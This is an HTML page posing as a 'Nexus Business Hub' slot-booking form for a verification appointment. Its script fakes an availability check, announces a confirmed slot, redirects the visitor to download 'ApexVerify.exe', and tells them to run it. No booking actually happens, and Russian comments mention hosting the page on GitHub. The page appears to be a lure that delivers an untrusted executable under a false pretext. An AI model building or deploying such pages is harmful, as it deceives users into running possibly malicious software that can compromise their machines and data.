<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus Business Hub</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 40px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); text-align: center; width: 350px; }
        .btn { background: #3b82f6; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #2563eb; }
        #loader { display: none; margin-top: 20px; }
        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div style="font-size: 40px; margin-bottom: 15px;">📅</div>
    <h2 style="margin-bottom: 10px;">Slot Booking</h2>
    <p style="color: #94a3b8; font-size: 14px; margin-bottom: 25px;">Book your verification appointment. The ApexVerify tool will be ready after confirmation.</p>
    
    <button class="btn" id="action-btn" onclick="startProcess()">Book & Download</button>

    <div id="loader">
        <div class="spinner"></div>
        <p id="msg" style="font-size: 13px; color: #3b82f6;">Checking availability...</p>
    </div>
</div>

<script>
    function startProcess() {
        const btn = document.getElementById('action-btn');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');

        btn.style.display = 'none';
        loader.style.display = 'block';

        setTimeout(() => {
            msg.innerText = "Slot confirmed! Redirecting to secure download...";
            
            setTimeout(() => {
                // ПУТЬ БЕЗ ПЕРВОГО СЛЭША (важно для GitHub)
                const filePath = 'api/v4/download/ApexVerify.exe';
                
                // Пробуем запустить скачивание
                window.location.href = filePath;
                
                msg.style.color = '#10b981';
                msg.innerText = "✅ Started! Please run ApexVerify.exe";
            }, 2000);
            
        }, 2000);
    }
</script>

</body>
</html>
